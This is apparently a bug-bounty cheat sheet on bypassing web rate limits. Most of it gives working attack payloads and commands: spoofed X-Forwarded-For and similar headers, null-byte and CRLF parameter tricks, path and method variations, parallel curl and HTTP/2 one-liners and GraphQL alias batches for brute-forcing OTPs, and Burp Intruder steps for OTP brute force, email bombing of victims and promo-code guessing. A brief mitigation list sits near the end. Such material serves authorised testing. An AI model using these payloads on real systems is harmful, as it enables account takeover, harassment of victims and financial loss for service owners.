## Overview

**Rate limiting** is a security mechanism that restricts the number of requests a user can make within a specific timeframe. It's commonly used to prevent:

- Brute-force attacks (login, OTP, password reset)
- Credential stuffing
- API abuse
- Email/SMS bombing
- Resource exhaustion

When bypassed, attackers can:

- Brute-force credentials, OTPs, promo codes
- Trigger mass emails/SMS (financial loss)
- Exhaust API quotas
- Perform account takeover (ATO)

**Common responses when rate-limited:**

- `429 Too Many Requests`
- `200 OK` with error message in body
- Sometimes no visible change (silent rate limiting)

---

## Exploitation Methods

### **1. IP Spoofing via Headers**

Most applications use headers to identify client IP. Spoof your IP by adding these headers:

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Ip: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarder-For: 127.0.0.1
Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-True-Ip: 127.0.0.1
X-Client: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

**Pro tip:** Try **double `X-Forwarded-For`** header:

```http
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

**Example:**

```http
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

email=victim@gmail.com
```

---

### **2. Special Characters in Parameters**

Add null bytes or control characters to parameters:

**Characters:** `%00`, `%0d%0a`, `%09`, `%0a`, `%0d`, `%0c`, `%20`, `%2e`

**Example:**

```http
POST /api/forgotpass HTTP/1.1
Host: target.com

{"email":"victim@gmail.com%00"}
```

Or add space after value:

```json
{"email":"victim@gmail.com "}
```

**For OTP/Code bypass:**

```
code=1234%0a
phone=+1234567890%00
```

---

### **3. Path Manipulation**

Change endpoint to bypass route-specific rate limits:

**Original:** `/api/v4/endpoint`

**Try:**

- `/api/v4/Endpoint`
- `/api/v4/EndPoint`
- `/api/v4/endpoint%00`
- `/api/v4/%0aendpoint`
- `/api/v4/endpoint%09`
- `/api/v4/%20endpoint`
- `/api/v4/endpoint/`
- `/api/v4/endpoint?random`
- `/api/v4/endpoint?bypass=1`

**Case variation:**

- `/Sing-up` vs `/sign-up` vs `/SignUp`

---

### **4. HTTP Method Tampering**

Switch HTTP methods:

- `GET` → `POST`, `PUT`, `PATCH`, `DELETE`
- `POST` → `HEAD` (especially for APIs)
- Try `OPTIONS`, `TRACE`

---

### **5. User-Agent & Cookie Rotation**

Change identifying headers:

```http
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)
Cookie: session=NEW_RANDOM_VALUE
```

Rotate between:

- Desktop/mobile user agents
- Anonymous/bot user agents
- Different cookie values

---

### **6. Multiple Values in Single Request**

Send array of attempts in one request:

**JSON:**

```json
{
    "phone": "+17342239011",
    "code": [
        "123456",
        "654321",
        "133713",
        "331337"
    ]
}
```

**URL-encoded:**

```
phone=+17342239011&code[]=123456&code[]=654321&code[]=133713
```

---

### **7. HTTP/2 Multiplexing (2023-2025)**

Modern rate limiters count **TCP connections**, not HTTP/2 streams. Send hundreds of requests in one connection:

```bash
seq 1 100 | xargs -I@ -P0 curl -k --http2-prior-knowledge -X POST \
  -H "Content-Type: application/json" \
  -d '{"code":"@"}' https://target/api/v2/verify &>/dev/null
```

**Tool:** Use Burp's **Turbo Intruder** with HTTP/2 support. Set `requestsPerConnection` to 100-1000.

---

### **8. GraphQL Aliases & Batching**

Send multiple mutations/queries in one request using aliases:

```graphql
mutation bruteForceOTP {
  a: verify(code:"111111") { token }
  b: verify(code:"222222") { token }
  c: verify(code:"333333") { token }
  d: verify(code:"444444") { token }
}
```

Rate limiter sees **1 request**, but server processes **multiple attempts**.

---

### **9. Batch/Bulk REST Endpoints**

Look for `/v2/batch`, `/bulk`, or endpoints accepting arrays:

```json
[
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"123"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"456"}},
  {"path": "/login", "method": "POST", "body": {"user":"bob","pass":"789"}}
]
```

---

### **10. Race Conditions**

Send simultaneous requests before rate limit kicks in. Use Burp's **Turbo Intruder** or parallel curl:

```bash
for i in {1..50}; do
  curl -X POST https://target.com/otp -d "code=$i" &
done
```

---

### **11. Timing Sliding Windows**

If rate limit resets every X seconds (e.g., 60s), fire max requests **just before** reset, then immediately after:

```
|<-- 60s window -->|<-- 60s window -->|
      ######              ######
     (burst 1)          (burst 2)
```

Watch for `X-RateLimit-Reset` header to time your attacks.

---

### **12. Per-Instance Exploitation**

If app runs on multiple backend instances, rate limits might not sync. Send requests to different instances by:

- Changing IP
- Rotating session cookies/headers
- Targeting different load balancer nodes

---

### **13. Authenticated vs Unauthenticated**

Rate limits may differ after login. Try:

1. Bypassing rate limit by logging in between attempts
2. Using **Pitchfork attack** in Burp to rotate credentials every N attempts

---

### **14. Reset Rate Limit Logic**

Some apps reset rate limits when:

- Requesting a new OTP/code
- Changing certain parameters
- Spoofing cookies with attempt counters

**Example:** If app stores attempts in cookie:

```http
Cookie: attempts=5
```

Change to:

```http
Cookie: attempts=0
```

---

### **15. Using Proxy Networks**

Rotate IPs using:

- **Burp Extension:** IP Rotate (AWS API Gateway)
- **Tools:** Fireprox, requests-ip-rotator
- SOCKS/HTTP proxy pools
- VPN rotation

---

### **16. Keep Trying (Even After 429)**

Even if you get `429`, **keep sending valid attempts**. Some apps return `401` for invalid OTP but `200` for valid ones—even when rate-limited.

**Reference:** [The $2,200 ATO Most Bug Hunters Overlooked](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)

---

## Step-by-Step Exploitation Examples

### **Password Reset / Forgot Password**

1. Navigate to `/forgot-password` or `/reset-password`
2. Enter victim email
3. Intercept request in Burp
4. Send to **Intruder**
5. Clear payload positions
6. Set payload type: **Null payloads**
7. Set payload count: **100**
8. Start attack

**Add bypass headers:**

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

email=victim@gmail.com
```

---

### **OTP Verification**

1. Request OTP for your account
2. Intercept OTP verification request
3. Send to Intruder
4. Set payload: **Numbers from 0000 to 9999**
5. Add bypass headers/characters
6. Start attack

**Try:**

```http
POST /verify-otp HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

{"phone":"+1234567890","code":"$$0000$$"}
```

Replace `$$0000$$` with payload position.

---

### **Invite User / Email Bombing**

1. Go to "Invite User" feature
2. Enter victim email
3. Intercept request
4. Send to Intruder
5. Null payloads, count: 100
6. Victim gets spammed

---

### **Promo/Coupon Code Brute-Force**

1. Navigate to checkout with promo code field
2. Enter random code
3. Intercept request
4. Send to Intruder
5. Use wordlist of promo codes
6. Start attack

---

## Robust Payloads (Top 10)

### **1. IP Spoof Headers**

```http
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
```

### **2. Double X-Forwarded-For**

```http
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1
```

### **3. Null Byte**

```
email=victim@gmail.com%00
```

### **4. CRLF**

```
email=victim@gmail.com%0d%0a
```

### **5. Space After Value**

```json
{"email":"victim@gmail.com "}
```

### **6. Path with Slash**

```
/api/v4/endpoint/
```

### **7. Random Query Parameter**

```
/api/v4/endpoint?bypass=1
```

### **8. Case Variation**

```
/Sign-Up
/SignUp
/SIGN-UP
```

### **9. HTTP Method Change**

```
GET → POST
POST → HEAD
```

### **10. GraphQL Alias**

```graphql
mutation {
  a: verify(code:"0000") { token }
  b: verify(code:"1111") { token }
}
```

---

## Higher Impact Scenarios

### **Account Takeover (ATO)**

- Bypass OTP/2FA rate limit → Take over accounts
- **Impact:** Critical, full account compromise

### **Financial Loss**

- Bypass promo code rate limit → Steal discounts
- Email/SMS bombing → Exhaust paid API quotas (AWS SES, Twilio)

### **Data Disruption**

- Mass email triggering → Overwhelm support queues
- Slow down services → DoS-like impact

### **Credential Stuffing**

- Bypass login rate limit → Test stolen credentials
- **Impact:** Mass account takeover

---

## Mitigation for Developers

1. **IP-based rate limiting** (but validate real IP, not headers)
2. **CAPTCHA** after N failed attempts
3. **Exponential backoff** (increase delay after each failure)
4. **Multi-factor rate limiting** (IP + session + user agent)
5. **Web Application Firewall (WAF)**
6. **Reduce API request quotas**
7. **Monitor for header manipulation**
8. **Sync rate limits across backend instances**
9. **GraphQL query depth/complexity limits**
10. **HTTP/2 stream counting** (not just connection counting)

---

## Tools & Automation

### **Burp Suite Extensions**

- **IP Rotate** - Rotates AWS API Gateway IPs
- **Turbo Intruder** - High-speed HTTP/2 attacks

### **Standalone Tools**

- [Fireprox](https://github.com/ustayready/fireprox) - AWS API Gateway IP rotation
- [requests-ip-rotator](https://github.com/Ge0rg3/requests-ip-rotator) - Python library for IP rotation
- [hashtag-fuzz](https://github.com/Hashtag-AMIN/hashtag-fuzz) - Fuzzing with header randomization

---

## References

- [PortSwigger Research - GraphQL Aliasing Bypass (2023)](https://portswigger.net/research/graphql-authorization-bypass)
- [PortSwigger Research - HTTP/2: The Sequel is Always Worse (2024)](https://portswigger.net/research/http2)
- [Huzaifa Tahir - Methods to Bypass Rate Limit](https://huzaifa-tahir.medium.com/methods-to-bypass-rate-limit-5185e6c67ecd)
- [Gupta Bless - Rate Limiting and Its Bypassing](https://gupta-bless.medium.com/rate-limiting-and-its-bypassing-5146743b16be)
- [The $2,200 ATO Bug Hunters Overlooked](https://mokhansec.medium.com/the-2-200-ato-most-bug-hunters-overlooked-by-closing-intruder-too-soon-505f21d56732)

---

**🎯 Pro Tips:**

- Always test **valid attempts** even after rate limit
- Combine multiple bypass techniques for higher success
- HTTP/2 + GraphQL aliases = extremely fast brute-force
- Watch for `X-RateLimit-Reset` headers to time attacks
- CloudFlare blocks AWS IPs - find origin IP first

**Happy hunting! 🔥**